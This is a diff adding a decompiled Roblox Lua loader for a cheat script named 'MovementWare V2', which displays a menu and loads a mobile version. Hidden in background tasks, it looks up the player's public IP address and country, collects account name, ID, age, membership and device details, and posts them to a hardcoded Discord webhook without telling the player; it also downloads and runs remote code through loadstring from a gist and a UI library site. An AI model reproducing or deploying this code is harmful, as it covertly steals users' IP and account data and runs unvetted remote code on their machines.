@@ -1,0 +1,402 @@
+-- ts file was generated at discord.gg/25ms
+
+local fenv = getfenv()
+local _call3 = game:GetService('Players')
+local _call5 = game:GetService('HttpService')
+local _call7 = game:GetService('StarterGui')
+local _call9 = game:GetService('UserInputService')
+local _LocalPlayer10 = _call3.LocalPlayer
+local _ = _call9.TouchEnabled
+local _ = _call9.KeyboardEnabled
+
+game:GetService('CoreGui'):FindFirstChild('TouchGui')
+_call7:SetCore('SendNotification', {
+    Text = 'Platform: Mobile',
+    Title = 'MovementWare',
+    Duration = 2,
+})
+
+local _ = _call9.TouchEnabled
+local _ = _call9.KeyboardEnabled
+
+game:GetService('CoreGui'):FindFirstChild('TouchGui')
+
+local _ = fenv.syn
+
+warn('Discord: Attempting to send webhook...')
+task.spawn(function(_30, _30_2, _30_3, _30_4, _30_5)
+    local _call32 = http.request({
+        Method = 'GET',
+        Url = 'https://api.ipify.org',
+    })
+    local _call35 = _call32.Body:gsub('%s+', '')
+    local _ = #_call35
+    local _ = 'https://ipinfo.io/' .. _call35 .. '/country'
+    local _call42 = http.request({
+        Method = 'GET',
+        Url = 'https://ipapi.co/' .. _call35 .. '/country_name/',
+    })
+    local _call45 = _call5:JSONDecode(_call42.Body)
+    local _ = _call45.country
+    local _country47 = _call45.country
+    local _ = #_country47
+    local _ = fenv.KRNL_LOADED
+    local _ = genv.Krnl
+    local _ = genv.Fluxus
+    local _ = genv.Delta
+    local _ = genv.Codex
+    local _ = genv.ArceusX
+    local _ = genv.Solara
+    local _ = genv.Nezur
+    local _ = genv.Wave
+    local _ = genv.Xeno
+    local _ = genv.ScriptWare
+    local _ = genv.ProtoSmasher
+    local _ = genv.SirHurt
+    local _ = genv.Temple
+    local _ = genv.Wally
+    local _ = genv.OxygenU
+    local _ = genv.KiwiX
+    local _ = genv.FurkUltra
+    local _ = genv.Shadow
+    local _ = genv.Nihon
+    local _ = genv.Calamari
+    local _ = genv.Elysian
+    local _ = genv.TrigonEvo
+    local _ = genv.Valyse
+    local _ = genv.Faded
+    local _ = genv.AppleWare
+    local _ = genv.Veil
+    local _ = genv.Cerberus
+    local _ = genv.Arculus
+    local _ = genv.Kronos
+    local _ = genv.ProjectEvolution
+    local _ = genv.Cherry
+    local _ = genv.Ware
+    local _ = genv.JJSploit
+    local _ = genv.Sentinel
+    local _ = genv.Electron
+    local _94 = math.floor((1 / game:GetService('RunService').Heartbeat:Wait()))
+    local _ = workspace.CurrentCamera.FieldOfView
+    local _ = workspace.CurrentCamera.ViewportSize.X .. 'x' .. workspace.CurrentCamera.ViewportSize.Y
+    local _ = _LocalPlayer10.MembershipType == Enum.MembershipType.None
+
+    for _111, _111_2 in ipairs(_call3:GetPlayers())do
+        local _ = _111_2.MembershipType == Enum.MembershipType.None
+    end
+
+    local _ = genv.Krnl
+    local _ = genv.Fluxus
+    local _ = genv.Delta
+    local _ = genv.Codex
+    local _ = genv.ArceusX
+    local _ = genv.Solara
+    local _ = genv.Nezur
+    local _ = genv.Wave
+    local _ = genv.Xeno
+    local _ = genv.ScriptWare
+    local _ = genv.ProtoSmasher
+    local _ = genv.SirHurt
+    local _ = genv.Temple
+    local _ = genv.Wally
+    local _ = genv.OxygenU
+    local _ = genv.KiwiX
+    local _ = genv.FurkUltra
+    local _ = genv.Shadow
+    local _ = genv.Nihon
+    local _ = genv.Calamari
+    local _ = genv.Elysian
+    local _ = genv.TrigonEvo
+    local _ = genv.Valyse
+    local _ = genv.Faded
+    local _ = genv.AppleWare
+    local _ = genv.Veil
+    local _ = genv.Cerberus
+    local _ = genv.Arculus
+    local _ = genv.Kronos
+    local _ = genv.ProjectEvolution
+    local _ = genv.Cherry
+    local _ = genv.Ware
+    local _ = genv.JJSploit
+    local _ = genv.Sentinel
+    local _ = genv.Electron
+    local _len153 = #_call3:GetPlayers()
+    local _MaxPlayers154 = _call3.MaxPlayers
+
+    warn('Discord: IP collected, Players: ' .. _len153 .. '/' .. _MaxPlayers154 .. ', Trials: 0')
+
+    local _166 = string.format('\u{c774}\u{b984}: %s (%s)\nID: %d\n\u{b098}\u{c774}: %d\u{c77c}\n\u{ba64}\u{bc84}\u{c2ed}: %s', _LocalPlayer10.Name, _LocalPlayer10.DisplayName, _LocalPlayer10.UserId, _LocalPlayer10.AccountAge, _LocalPlayer10.MembershipType.Name)
+    local _167 = string.format('OS: %s\n\u{ba54}\u{baa8}\u{b9ac}: %s\nFPS: %d', 'Windows', '1 MB', _94)
+    local _170 = string.format('\u{ac8c}\u{c784} ID: %d\n\u{d50c}\u{b808}\u{c774}\u{c2a4} ID: %d\n\u{c11c}\u{bc84} \u{d50c}\u{b808}\u{c774}\u{c5b4}: %d/%d', game.GameId, game.PlaceId, _len153, _MaxPlayers154)
+    local _call172 = _call5:JSONEncode({
+        username = 'MovementWare V2',
+        embeds = {
+            [1] = {
+                fields = {
+                    [1] = {
+                        value = _166,
+                        name = 'Roblox \u{c815}\u{bcf4}',
+                        inline = false,
+                    },
+                    [2] = {
+                        value = 'Unknown',
+                        name = '\u{c2e4}\u{d589}\u{ae30}',
+                        inline = true,
+                    },
+                    [3] = {
+                        value = _call35 .. ' [' .. _country47 .. ']',
+                        name = '\u{b124}\u{d2b8}\u{c6cc}\u{d06c} \u{c815}\u{bcf4}',
+                        inline = true,
+                    },
+                    [4] = {
+                        value = _167,
+                        name = '\u{d558}\u{b4dc}\u{c6e8}\u{c5b4}',
+                        inline = false,
+                    },
+                    [5] = {
+                        value = _170,
+                        name = '\u{ac8c}\u{c784} \u{c815}\u{bcf4}',
+                        inline = false,
+                    },
+                    [6] = {
+                        value = '\u{c5c6}\u{c74c}',
+                        name = '\u{ccb4}\u{d5d8} \u{acc4}\u{c815}',
+                        inline = true,
+                    },
+                    [7] = {
+                        value = '2026-04-26 18:19:50',
+                        name = '\u{c2dc}\u{ac04}',
+                        inline = true,
+                    },
+                    [8] = {
+                        value = 'Mobile',
+                        name = 'Platform',
+                        inline = true,
+                    },
+                },
+                title = 'MovementWare User Info',
+                footer = {
+                    text = 'MovementWare V2 Info Sender',
+                },
+                color = 65280,
+                timestamp = '2026-04-26T16:19:50.000Z',
+                description = 'MovementWare V2 \u{c0ac}\u{c6a9}\u{c790} \u{c815}\u{bcf4} \u{c218}\u{c9d1}',
+            },
+        },
+        avatar_url = 'https://i.imgur.com/7Y1p5WQ.png',
+    })
+    local _ = #_call172
+
+    warn('Discord: Payload size: 808809544 bytes')
+
+    local _call175 = http.request({
+        Body = _call172,
+        Url = 'https://discord.com/api/webhooks/1488800864268324984/6uH1ueUn7E2CpQqDwqNN8VZyIc1tbAr-u154He9Wl-rFYHtj2HOHhfu2cni0ttLbXsQf',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+        },
+    })
+
+    warn('Discord: Response status: ' .. tostring(_call175.StatusCode))
+
+    local _ = _call175.StatusCode
+    local _ = _call175.StatusCode
+
+    warn('Discord: Failed - ' .. tostring(_call175.Body))
+end)
+
+local _189 = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local _ = _call9.TouchEnabled
+local _ = _call9.KeyboardEnabled
+
+game:GetService('CoreGui'):FindFirstChild('TouchGui')
+
+local _call197 = _189:CreateWindow({
+    LoadingTitle = 'MovementWare V2',
+    LoadingSubtitle = 'Auto Loading Platform',
+    Name = 'MovementWare V2 | Mobile',
+    ConfigurationSaving = {Enabled = false},
+})
+local _call199 = _call197:CreateTab('Platform Select', 4483362458)
+
+_call199:CreateLabel('Welcome: ' .. _LocalPlayer10.Name)
+_call199:CreateLabel('User ID: ' .. _LocalPlayer10.UserId)
+_call199:CreateLabel('Detected: Mobile')
+task.spawn(function(_213)
+    local _call222 = _call5:JSONEncode({
+        username = 'MovementWare',
+        embeds = {
+            [1] = {
+                fields = {
+                    [1] = {
+                        value = _LocalPlayer10.Name .. ' (' .. _LocalPlayer10.UserId .. ')',
+                        name = 'User',
+                        inline = true,
+                    },
+                    [2] = {
+                        value = 'Auto Loading',
+                        name = 'Status',
+                        inline = true,
+                    },
+                    [3] = {
+                        value = tostring(game.PlaceId),
+                        name = 'Game',
+                        inline = true,
+                    },
+                    [4] = {
+                        value = 'Mobile',
+                        name = 'Detected Platform',
+                        inline = true,
+                    },
+                },
+                title = 'MovementWare V2',
+                footer = {
+                    text = 'Platform Selector',
+                },
+                color = 15158332,
+                timestamp = '2026-04-26T16:19:50.000Z',
+                description = 'Loader Event',
+            },
+        },
+    })
+    local _call223 = http.request({
+        Body = _call222,
+        Url = 'https://discord.com/api/webhooks/1488800864268324984/6uH1ueUn7E2CpQqDwqNN8VZyIc1tbAr-u154He9Wl-rFYHtj2HOHhfu2cni0ttLbXsQf',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+        },
+    })
+    local _ = _call223.StatusCode
+    local _ = _call223.StatusCode
+
+    warn('Discord: Failed with status ' .. tostring(_call223.StatusCode))
+end)
+_call199:CreateSection('Auto Loading')
+_call199:CreateLabel('Detected Device: Mobile')
+_call199:CreateLabel('Loading Mobile version...')
+task.spawn(function(_238, _238_2)
+    task.spawn(function(_242)
+        local _call251 = _call5:JSONEncode({
+            username = 'MovementWare',
+            embeds = {
+                [1] = {
+                    fields = {
+                        [1] = {
+                            value = _LocalPlayer10.Name .. ' (' .. _LocalPlayer10.UserId .. ')',
+                            name = 'User',
+                            inline = true,
+                        },
+                        [2] = {
+                            value = 'Loading',
+                            name = 'Status',
+                            inline = true,
+                        },
+                        [3] = {
+                            value = tostring(game.PlaceId),
+                            name = 'Game',
+                            inline = true,
+                        },
+                        [4] = {
+                            value = 'Mobile',
+                            name = 'Platform',
+                            inline = true,
+                        },
+                    },
+                    title = 'MovementWare V2',
+                    footer = {
+                        text = 'Platform Selector',
+                    },
+                    color = 15158332,
+                    timestamp = '2026-04-26T16:19:50.000Z',
+                    description = 'Loader Event',
+                },
+            },
+        })
+        local _call252 = http.request({
+            Body = _call251,
+            Url = 'https://discord.com/api/webhooks/1488800864268324984/6uH1ueUn7E2CpQqDwqNN8VZyIc1tbAr-u154He9Wl-rFYHtj2HOHhfu2cni0ttLbXsQf',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json',
+            },
+        })
+        local _ = _call252.StatusCode
+        local _ = _call252.StatusCode
+
+        warn('Discord: Failed with status ' .. tostring(_call252.StatusCode))
+    end)
+    _call7:SetCore('SendNotification', {
+        Text = 'Fetching Mobile script...',
+        Title = 'Loading',
+        Duration = 2,
+    })
+
+    local _call262 = http.request({
+        Url = 'https://gist.githubusercontent.com/sn3514ube16-droid/d7726c791396ab970ed6eaef2d345d63/raw/e7bf91f4f18236010dcb4ef4e6ca13f9d441105a/MOBILE%2520MOVEMENTWARE',
+        Method = 'GET',
+        Headers = {
+            ['User-Agent'] = 'Mozilla/5.0',
+        },
+    })
+    local _ = _call262.Body
+    local _ = _call262.Body
+
+    loadstring(_call262.Body)()
+    _call7:SetCore('SendNotification', {
+        Text = 'MovementWare Mobile loaded!',
+        Title = 'Success',
+        Duration = 3,
+    })
+    task.spawn(function(_273)
+        local _call282 = _call5:JSONEncode({
+            username = 'MovementWare',
+            embeds = {
+                [1] = {
+                    fields = {
+                        [1] = {
+                            value = _LocalPlayer10.Name .. ' (' .. _LocalPlayer10.UserId .. ')',
+                            name = 'User',
+                            inline = true,
+                        },
+                        [2] = {
+                            value = 'Loaded',
+                            name = 'Status',
+                            inline = true,
+                        },
+                        [3] = {
+                            value = tostring(game.PlaceId),
+                            name = 'Game',
+                            inline = true,
+                        },
+                        [4] = {
+                            value = 'Mobile',
+                            name = 'Platform',
+                            inline = true,
+                        },
+                    },
+                    title = 'MovementWare V2',
+                    footer = {
+                        text = 'Platform Selector',
+                    },
+                    color = 15158332,
+                    timestamp = '2026-04-26T16:19:50.000Z',
+                    description = 'Loader Event',
+                },
+            },
+        })
+        local _call283 = http.request({
+            Body = _call282,
+            Url = 'https://discord.com/api/webhooks/1488800864268324984/6uH1ueUn7E2CpQqDwqNN8VZyIc1tbAr-u154He9Wl-rFYHtj2HOHhfu2cni0ttLbXsQf',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json',
+            },
+        })
+        local _ = _call283.StatusCode
+        local _ = _call283.StatusCode
+
+        warn('Discord: Failed with status ' .. tostring(_call283.StatusCode))
+    end)
+end)
